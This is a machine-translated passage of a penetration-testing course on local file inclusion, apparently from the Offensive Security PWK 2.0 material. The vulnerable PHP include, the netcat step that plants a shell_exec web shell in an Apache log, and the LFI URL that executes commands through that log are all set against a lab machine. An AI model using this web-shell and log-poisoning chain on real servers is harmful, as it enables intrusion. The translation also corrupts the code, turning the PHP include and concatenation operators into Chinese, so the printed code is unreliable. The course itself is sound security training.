<div style="position:absolute;top:109980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将它们的值更改为 URL 而不是本地路径。</font><font style="vertical-align: inherit;">我们不太可能发现 RFI 漏洞</font></font></nobr></div>
<div style="position:absolute;top:110000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于现代 PHP 版本的默认配置禁用远程 URL 包含，一个键</font></font></nobr></div>
<div style="position:absolute;top:110019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要执行远程代码的功能。</font><font style="vertical-align: inherit;">但是，我们仍然应该测试 RFI，因为它们通常是</font></font></nobr></div>
<div style="position:absolute;top:110038;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比 LFI 更容易被利用。</font><font style="vertical-align: inherit;">我们可以像我们一样使用 Netcat、Apache 或 Python 来处理请求</font></font></nobr></div>
<div style="position:absolute;top:110058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用 XSS 做的。</font><font style="vertical-align: inherit;">我们可能需要尝试在不同的端口上托管我们的有效负载，因为任何远程</font></font></nobr></div>
<div style="position:absolute;top:110077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标服务器发起的连接可能会受到内部防火墙或路由规则的约束。</font><font style="vertical-align: inherit;">一些</font></font></nobr></div>
<div style="position:absolute;top:110097;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能需要反复试验。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:110131;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.2 利用本地文件包含（LFI）</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们回到 Windows 10 实验室机器上的示例应用程序。</font><font style="vertical-align: inherit;">我们会去我们的地方</font></font></nobr></div>
<div style="position:absolute;top:110185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">停止目录遍历攻击并查看 menu.php 的源代码以澄清</font></font></nobr></div>
<div style="position:absolute;top:110204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在处理的事情：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">37 &lt;?php</font></font></nobr></div>
<div style="position:absolute;top:110256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38 $file = $_GET["file"];</font></font></nobr></div>
<div style="position:absolute;top:110273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">39     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含 $file; </font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">?&gt;</font></font></nobr></div>
<div style="position:absolute;top:110292;left:338"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 295 - menu.php 中的代码摘录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应用程序</font><font style="vertical-align: inherit;">从请求查询字符串中</font><font style="vertical-align: inherit;">读取</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数，然后使用该值</font></font></nobr></div>
<div style="position:absolute;top:110341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">include </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">276</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句。</font><font style="vertical-align: inherit;">这意味着应用程序将执行任何 PHP 代码</font></font></nobr></div>
<div style="position:absolute;top:110360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定的文件。</font><font style="vertical-align: inherit;">如果应用程序使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fread</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开文件</font><font style="vertical-align: inherit;">并使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示内容，</font></font></nobr></div>
<div style="position:absolute;top:110380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件中的任何代码都将显示而不是执行。</font></font></nobr></div>
<div style="position:absolute;top:110412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们能以某种方式编写 PHP，我们可能能够将此漏洞推送到远程代码执行</font></font></nobr></div>
<div style="position:absolute;top:110432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码到本地文件。</font><font style="vertical-align: inherit;">既然我们无法将文件上传到服务器，我们有什么选择？</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:110531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">276 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（PHP 集团，2019 年），https://www.php.net/manual/en/function.include.php</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:110659;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="94"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 94 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:110692;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:111769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:111769;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:111769;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">314</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:110788;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.3 污染日志文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:110822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以尝试将代码注入服务器的一种方法是通过日志文件中毒。</font><font style="vertical-align: inherit;">大多数应用</font></font></nobr></div>
<div style="position:absolute;top:110842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器将记录请求的所有 URL。</font><font style="vertical-align: inherit;">我们可以通过提交一个来利用这一点</font></font></nobr></div>
<div style="position:absolute;top:110861;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含 PHP 代码的请求。</font><font style="vertical-align: inherit;">一旦请求被记录下来，我们就可以在我们的 LFI 中使用日志文件</font></font></nobr></div>
<div style="position:absolute;top:110880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷。</font></font></nobr></div>
<div style="position:absolute;top:110913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本模块中使用的工具，尤其是 Dirb，可以用大量噪音填充 Apache 日志文件。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:110933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果日志文件相对干净，则本节的后续步骤更容易查看和理解。</font><font style="vertical-align: inherit;">出色地</font></font></nobr></div>
<div style="position:absolute;top:110952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Windows 10 客户端上的 Documents/clear_logs.ps1 脚本清理</font></font></nobr></div>
<div style="position:absolute;top:110971;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache 日志文件。</font></font></nobr></div>
<div style="position:absolute;top:111004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-ExecutionPolicy Bypass</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行脚本</font><font style="vertical-align: inherit;">以暂时允许未签名的脚本和</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:111024;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 文件 clear_logs.ps1</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以指定要执行的脚本：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:111059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\admin\Documents&gt; </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell -ExecutionPolicy Bypass -File clear_logs.ps1</font></font></font></b></nobr></div>
<div style="position:absolute;top:111078;left:286"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 296 - 运行 PS1 脚本来清除 Apache 日志文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们使用 Netcat 在端口 80 上连接到我们的 Windows 10 实验室机器，有趣的是</font></font></nobr></div>
<div style="position:absolute;top:111127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷。</font><font style="vertical-align: inherit;">让我们来看看有效负载的组件。</font></font></nobr></div>
<div style="position:absolute;top:111159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，请注意整个有效负载是用 PHP 编写的：它以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;?php</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开头，</font><font style="vertical-align: inherit;">以</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">?&gt;</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结尾</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:111179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大部分 PHP 负载是一个简单的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">echo</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，它将输出打印到页面。</font><font style="vertical-align: inherit;">这个输出</font></font></nobr></div>
<div style="position:absolute;top:111198;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先包裹在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pre</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> HTML 标签中，这些标签保留了结果中的任何换行符或格式</font></font></nobr></div>
<div style="position:absolute;top:111217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">函数调用。</font><font style="vertical-align: inherit;">接下来是函数调用本身，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell_exec</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它将执行操作系统命令。</font><font style="vertical-align: inherit;">最后，</font></font></nobr></div>
<div style="position:absolute;top:111237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统命令是通过</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_GET['cmd']</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 GET 请求的“cmd”参数中获取的</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:111256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一行 PHP 将让我们通过查询字符串指定一个操作系统命令并将结果输出到</font></font></nobr></div>
<div style="position:absolute;top:111275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">浏览器。</font></font></nobr></div>
<div style="position:absolute;top:111308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在让我们发送该有效载荷：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:111343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nv 10.11.0.22 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:111360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.0.22] 80 (http) 打开</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:111377;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;?php echo '&lt;pre&gt;' 。</font><font style="vertical-align: inherit;">shell_exec($_GET['cmd']) 。</font><font style="vertical-align: inherit;">'&lt;/pre&gt;';?&gt;</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:111411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP/1.1 400 错误请求</font></font></nobr></div>
<div style="position:absolute;top:111430;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 297 - 使用 Netcat 发送 PHP 负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:111460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管出现了“Bad Request” </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">277</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误（因为我们没有发出有效的 HTTP 请求而产生），我们</font></font></nobr></div>
<div style="position:absolute;top:111479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过检查我们 Windows 10 实验室上的 Apache 日志文件来验证请求是否已提交</font></font></nobr></div>
<div style="position:absolute;top:111498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
<div style="position:absolute;top:111531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过打开 C:\xampp\apache\logs\access.log 或使用 XAMPP 来查看这些日志</font></font></nobr></div>
<div style="position:absolute;top:111551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">控制面板。</font></font></nobr></div>
<div style="position:absolute;top:111583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的负载应该在日志文件的末尾附近找到：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:111618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.4 - - [30/Nov/2019:13:55:12 -0500]</font></font></nobr></div>
<div style="position:absolute;top:111635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"GET /css/bootstrap.min.css HTTP/1.1" 200 155758 "http://10.11.0.22/menu.php?file=\\Wi</font></font></nobr></div>
<div style="position:absolute;top:111652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ndows\\System32\\drivers\\etc\\hosts" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:111719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">277 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Mozilla，2019），https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/400</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:111847;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="95"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 95 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:111880;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:112957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:112957;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:112957;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">315</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:111976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20100101 火狐/60.0"</font></font></nobr></div>
<div style="position:absolute;top:111992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.4 - - [30/Nov/2019:13:58:07 -0500] "GET /tacotruck.php HTTP/1.1" 200 1189 "htt</font></font></nobr></div>
<div style="position:absolute;top:112009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">p://10.11.0.22/menu.php?file=/" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/201001</font></font></nobr></div>
<div style="position:absolute;top:112026;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01 火狐/60.0"</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:112044;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.4 - - [30/Nov/2019:14:01:41 -0500] ""&lt;?php echo '&lt;pre&gt;' 。</font><font style="vertical-align: inherit;">shell_exec($_GET['cm</font></font></b></nobr></div>
<div style="position:absolute;top:112060;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">d'])。</font><font style="vertical-align: inherit;">'&lt;/pre&gt;';?&gt;\n" 400 981 "-" "-"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112080;left:358"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 298 - Apache access.log 文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:112109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于我们的有效负载已被记录，我们可以尝试执行 LFI。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:112144;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.4 LFI 代码执行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:112178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将使用 LFI 漏洞来包含包含我们的 PHP 的 Apache access.log 文件</font></font></nobr></div>
<div style="position:absolute;top:112197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷。</font><font style="vertical-align: inherit;">我们知道应用程序正在使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">include</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句，因此包含文件的内容</font></font></nobr></div>
<div style="position:absolute;top:112217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将作为 PHP 代码执行。</font></font></nobr></div>
<div style="position:absolute;top:112249;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将构建一个 URL，其中包含日志的位置以及要执行的命令</font></font></nobr></div>
<div style="position:absolute;top:112269;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 作为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数的值</font><font style="vertical-align: inherit;">发送</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://10.11.0.22/menu.php? </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件=c:\xampp\apache\logs\access.log </font></font></font><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&amp;cmd=ipconfig</font></font></font></b></nobr></div>
<div style="position:absolute;top:112323;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 299 - 使用中毒的日志文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:112353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将 URL 发送到 Web 服务器后，输出应如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:112840;left:309"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 156：执行带有 LFI 漏洞的代码</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:112871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果一切正常，页面底部应该包括</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的输出</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:113035;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="96"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 96 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:113068;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:114145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:114145;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:114145;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">316</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">那么这里究竟发生了什么？</font><font style="vertical-align: inherit;">感谢应用程序的 PHP </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">include</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">语句和我们的能力</font></font></nobr></div>
<div style="position:absolute;top:113183;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要指定要包含的文件（清单 295），受污染的 access.log 文件的内容是</font></font></nobr></div>
<div style="position:absolute;top:113202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由网页执行。</font></font></nobr></div>
<div style="position:absolute;top:113235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PHP 引擎依次运行</font><font style="vertical-align: inherit;">日志文件文本</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;?php echo shell_exec($_GET['cmd']);?&gt;</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分</font></font></nobr></div>
<div style="position:absolute;top:113255;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（我们的有效负载），</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmd</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">变量的值为“ipconfig”，本质</font><font style="vertical-align: inherit;">上是在目标</font><font style="vertical-align: inherit;">上运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipconfig</font></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:113274;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并显示输出。</font><font style="vertical-align: inherit;">日志文件中的附加行只是显示，因为它们确实如此</font></font></nobr></div>
<div style="position:absolute;top:113293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不包含有效的 PHP 代码。</font></font></nobr></div>
<div style="position:absolute;top:113326;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这当然不是开发商的本意！</font></font></nobr></div>
<div style="position:absolute;top:113359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们已经演示了如何通过日志文件中毒获得代码执行，我们应该</font></font></nobr></div>
<div style="position:absolute;top:113378;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">能够在系统上获得一个shell。</font><font style="vertical-align: inherit;">我们将把它留给读者作为练习。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:113413;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.5 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1、利用LFI攻击获取代码执行。</font></font></nobr></div>
<div style="position:absolute;top:113471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.使用代码执行获取完整shell。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:113506;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.4.4.6 远程文件包含（RFI）</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:113540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程文件包含 (RFI) 漏洞不如 LFI 常见，因为服务器必须是</font></font></nobr></div>
<div style="position:absolute;top:113559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以非常具体的方式配置，但它们通常更容易被利用。</font><font style="vertical-align: inherit;">例如，PHP 应用程序必须</font></font></nobr></div>
<div style="position:absolute;top:113579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">allow_url_include</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置为“On”。</font><font style="vertical-align: inherit;">旧版本的 PHP 默认设置为启用，但</font></font></nobr></div>
<div style="position:absolute;top:113598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">较新的版本默认为“关闭”。</font><font style="vertical-align: inherit;">如果我们可以强制 Web 应用程序加载远程文件并执行</font></font></nobr></div>
<div style="position:absolute;top:113617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代码，我们在创建漏洞利用负载方面有更大的灵活性。</font></font></nobr></div>
<div style="position:absolute;top:113650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们看一个 RFI 漏洞的例子。</font><font style="vertical-align: inherit;">之前展示的 LFI 漏洞是</font></font></nobr></div>
<div style="position:absolute;top:113670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也容易受到 RFI 的影响。</font><font style="vertical-align: inherit;">考虑以下：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
